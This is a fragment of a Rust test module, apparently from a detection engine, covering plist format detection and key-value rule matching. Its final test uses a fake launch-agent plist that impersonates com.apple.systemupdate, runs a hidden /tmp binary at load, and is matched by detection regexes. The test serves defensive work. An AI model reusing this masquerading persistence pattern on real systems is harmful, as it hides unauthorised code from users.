    fn test_detect_plist_by_extension() {
        assert_eq!(
            detect_format(Path::new("Info.plist"), b""),
            StructuredFormat::Plist
        );
    }

    #[test]
    fn test_detect_xml_plist_by_content() {
        let content = b"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n<key>Label</key>\n<string>test</string>\n</dict>\n</plist>";
        assert_eq!(
            detect_format(Path::new("unknown"), content),
            StructuredFormat::Plist
        );
    }

    #[test]
    fn test_detect_binary_plist_by_content() {
        let content = b"bplist00\xd1\x01\x02STest\x08\x0b\x10\x00\x00\x00\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x15";
        assert_eq!(
            detect_format(Path::new("unknown"), content),
            StructuredFormat::Plist
        );
    }

    #[test]
    fn test_xml_plist_evaluation() {
        let plist = b"<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<plist version=\"1.0\">
<dict>
    <key>CFBundleIdentifier</key>
    <string>com.example.app</string>
    <key>LSMinimumSystemVersion</key>
    <string>10.15</string>
    <key>Permissions</key>
    <array>
        <string>camera</string>
        <string>microphone</string>
    </array>
</dict>
</plist>";

        let path = Path::new("Info.plist");

        // Test exact match
        let cond = Condition::Kv {
            path: "CFBundleIdentifier".to_string(),
            exact: Some("com.example.app".to_string()),
            substr: None,
            regex: None,
            case_insensitive: false,
            compiled_regex: None,
        };
        assert!(evaluate_kv(&cond, plist, path).is_some());

        // Test match in array
        let cond = Condition::Kv {
            path: "Permissions".to_string(),
            exact: Some("camera".to_string()),
            substr: None,
            regex: None,
            case_insensitive: false,
            compiled_regex: None,
        };
        assert!(evaluate_kv(&cond, plist, path).is_some());

        // Test non-matching
        let cond = Condition::Kv {
            path: "CFBundleIdentifier".to_string(),
            exact: Some("com.other.app".to_string()),
            substr: None,
            regex: None,
            case_insensitive: false,
            compiled_regex: None,
        };
        assert!(evaluate_kv(&cond, plist, path).is_none());
    }

    #[test]
    fn test_plist_masquerading_detection() {
        let plist = b"<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<plist version=\"1.0\">
<dict>
    <key>Label</key>
    <string>com.apple.systemupdate</string>
    <key>Program</key>
    <string>/tmp/.hidden_updater</string>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>";

        let path = Path::new("com.apple.systemupdate.plist");

        // Test Label starts with com.apple.
        let cond_label = Condition::Kv {
            path: "Label".to_string(),
            exact: None,
            substr: None,
            regex: Some(r"^com\.apple\.".to_string()),
            case_insensitive: false,
            compiled_regex: Some(Regex::new(r"^com\.apple\.").unwrap()),
        };
        assert!(evaluate_kv(&cond_label, plist, path).is_some());

        // Test Program is in /tmp/
        let cond_program = Condition::Kv {
            path: "Program".to_string(),
            exact: None,
            substr: None,
            regex: Some(r"^/tmp/".to_string()),
            case_insensitive: false,
            compiled_regex: Some(Regex::new(r"^/tmp/").unwrap()),
        };
        assert!(evaluate_kv(&cond_program, plist, path).is_some());
    }
}
